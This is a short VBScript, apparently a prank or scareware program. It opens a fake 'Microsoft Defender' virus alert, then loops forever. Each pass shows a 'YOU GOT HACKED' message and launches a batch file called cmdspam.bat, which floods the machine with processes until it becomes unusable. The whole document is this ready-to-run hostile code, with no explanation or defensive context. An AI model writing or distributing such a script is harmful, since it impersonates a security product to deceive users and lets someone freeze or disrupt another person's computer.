Msgbox "Virus Detected! Press OK to quarantine", vbExclamation, "Microsoft Defender"
Function ShowWarning()
    MsgBox "YOU GOT HACKED.", vbOKOnly + vbInformation, "COOKED"
End Function
Set sh = CreateObject("WScript.Shell")

Do While True
Call ShowWarning()
sh.Run "cmdspam.bat", 1, False
Loop